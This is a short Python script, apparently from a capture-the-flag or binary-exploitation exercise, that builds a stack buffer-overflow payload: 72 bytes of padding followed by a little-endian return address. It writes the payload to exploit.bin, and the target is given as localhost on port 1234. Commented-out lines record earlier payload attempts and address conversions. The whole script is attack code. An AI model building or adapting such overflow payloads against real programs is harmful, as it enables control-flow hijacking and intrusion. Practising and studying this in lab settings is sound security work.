
SERVER = "localhost"
PORT = 1234 
#exploit = b'A'*72 + b'\xe2\x91\x04\x08'+b'A'*4+b'\xef\xbe\xad\xde\r\xd0\xde\xc0\r'

#,0x1337bab3 "\xb3\xba\x37\x13"
#
#0x000055555555523f
#55 55 55 55 52 3f = \x3f\x52\x55\x55\x55\x55\x00\x00

#PRINTF 0x0000 55 55 55 55 52 94 = \x94\x52\x55\x55\x55\x55
#PRINTF 0x55 55 55 55 60 55 = \x55\x60\x55\x55\x55\x55



offset = b"A" * 72
#ebpfalg = b"\xb3\xba\x37\x13"
ebpflag = b"\x55\x60\x55\x55\x55\x55"
exploit = offset + ebpflag
f = open("exploit.bin", "wb")
f.write(exploit)
f.close()
print(exploit)
